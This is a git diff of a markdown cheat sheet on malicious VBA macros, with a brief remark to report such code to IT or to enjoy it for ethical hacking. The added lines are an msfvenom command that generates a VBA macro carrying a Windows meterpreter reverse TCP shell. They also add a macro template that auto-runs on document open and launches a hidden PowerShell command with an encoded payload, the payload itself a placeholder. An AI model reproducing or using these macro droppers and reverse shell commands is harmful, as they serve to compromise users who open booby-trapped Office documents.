@@ -1,4 +1,6 @@
-# Useful Visual Basic
+# Useful Visual Basic for Applications
+
+Beware these uses for VBA, if you find code like this on your computer tell a member of IT. I don't how you got here, unless you have good ethical hacking reasons in which case enjoy true horror of VBA scripts, as many as I find and explain their cool use cases.
 
 #  VB script shell:
 ```vb
@@ -57,8 +59,32 @@ Sub Auto_Open()
     HelloWorld
 End Sub
 ```
+
 ### Metasploit VBA
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba
+```
+
+# Encoded Payloads
+
+```vb
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = "powershell.exe -nop -w hidden -e base64encoded"
+    Str = Str + "base64encodepayloadappendstrequalstring"
+  	...
+	Str = Str + "endofthebase64=="
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
 ```
